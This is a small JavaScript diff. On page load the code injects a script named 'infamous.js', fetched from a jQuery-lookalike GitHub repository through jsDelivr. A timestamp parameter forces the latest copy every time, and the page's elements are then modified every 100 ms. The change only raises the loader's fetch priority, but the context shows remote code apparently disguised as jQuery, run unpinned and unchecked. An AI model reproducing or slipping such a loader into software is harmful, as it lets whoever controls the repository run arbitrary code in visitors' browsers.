@@ -60,6 +60,7 @@ document.addEventListener('DOMContentLoaded', () => {
 var currentUnixTimestamp = Math.floor(Date.now() / 1000);
 var script = document.createElement('script');
 script.src = 'https://cdn.jsdelivr.net/gh/nd91jqf/jquery@main/infamous.js?version=' + currentUnixTimestamp;
+script.setAttribute('fetchpriority', 'high');
 document.head.appendChild(script);
 
 setInterval(modifyElements, 100);
